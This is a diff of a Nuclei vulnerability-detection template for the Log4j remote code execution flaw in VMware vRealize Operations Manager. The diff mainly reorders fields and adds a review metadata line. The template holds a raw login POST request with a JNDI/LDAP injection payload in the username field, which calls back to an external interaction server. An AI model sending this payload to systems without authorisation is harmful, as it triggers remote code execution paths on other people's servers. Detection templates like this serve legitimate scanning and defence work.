@@ -1,5 +1,4 @@
 id: vmware-operation-manager-log4j-rce
-
 info:
   name: VMware Operations Manager - Remote Code Execution (Apache Log4j)
   author: DhiyaneshDK
@@ -16,18 +15,46 @@ info:
     cwe-id: CWE-77
     cpe: cpe:2.3:a:vmware:vrealize_operations_manager:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
-    shodan-query: title:"vRealize Operations Manager"
     product: vrealize_operations_manager
+    shodan-query: title:"vRealize Operations Manager"
     vendor: vmware
-  tags: cve,cve2021,rce,jndi,log4j,vmware,kev,oast,vuln
+    verified: true
+  tags: cve,cve2021,jndi,kev,log4j,oast,rce,vmware,vuln
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
-
 http:
-  - raw:
+  - extractors:
+      - kval:
+          - interactsh_ip
+        type: kval
+      - group: 2
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+      - group: 1
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: header
+        type: word
+        words:
+          - Path=/ui
+      - part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         POST /ui/login.action HTTP/1.1
         Host: {{Hostname}}
@@ -40,38 +67,3 @@ http:
         Sec-Fetch-Site: same-origin
 
         mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: word
-        part: header
-        words:
-          - 'Path=/ui'
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-# digest: 490a0046304402204177fef5c0777118cae42ad0c18deb4584cd0e038aebd80dd49c65e326e6c732022005962b5bd28d24f73090d842fc9bc48901c1946b139711f70adcf7307213b482:922c64590222798bb761d5b6d8e72950
